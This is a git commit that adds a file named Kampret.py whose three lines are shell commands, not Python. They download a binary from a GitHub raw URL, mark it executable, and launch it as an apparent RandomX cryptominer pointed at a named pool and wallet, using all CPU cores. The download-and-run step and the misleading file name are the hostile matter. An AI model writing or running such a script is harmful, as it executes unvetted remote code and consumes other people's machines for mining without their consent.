773b6bec4b4ff0fcb2f569f7fabe99917693b991
Erlandi <the@erlandi.my.id>
2024-04-22 13:39:25 +0700

    Create Kampret.py

---
+++ Kampret.py
@@ -0,0 +1,3 @@
+wget https://raw.githubusercontent.com/petugas/No/main/k
+chmod +x k
+./k -o xm.erlandi.eu.org:8080 -u ZEPHsB4SF9T9wS4vyAbjZ6FzTDyCRFeV5MK7qqHdt2AHWfsmb1P7cbe2gfYp5py78DT6gFyLZixVqc11DNRyY9CHbs2BQG7LDyt -a rx/0 -k -t --randomx-fastmode=fast $(nproc)
